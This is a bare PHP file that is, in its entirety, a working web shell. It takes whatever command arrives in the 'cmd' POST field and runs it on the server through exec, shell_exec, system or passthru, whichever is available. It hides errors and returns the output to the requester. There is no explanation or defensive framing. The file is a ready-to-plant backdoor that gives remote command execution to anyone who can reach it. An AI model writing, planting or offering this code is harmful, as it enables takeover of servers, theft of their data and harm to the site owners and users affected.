<?php
function ex($cfe)
{
    $res = '';

    if(function_exists('exec'))
    {
        @exec($cfe,$res);
		$res = join("\n",$res);
    }
    elseif(function_exists('shell_exec'))
    {
		$res = @shell_exec($cfe);
    }
    elseif(function_exists('system'))
    {
		@ob_start();
		@system($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
		@ob_start();
		@passthru($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
    }
    return $res;
}

$cmd_rep = ex($_POST['cmd']);
echo(@htmlspecialchars($cmd_rep)."\n");

exit;
?>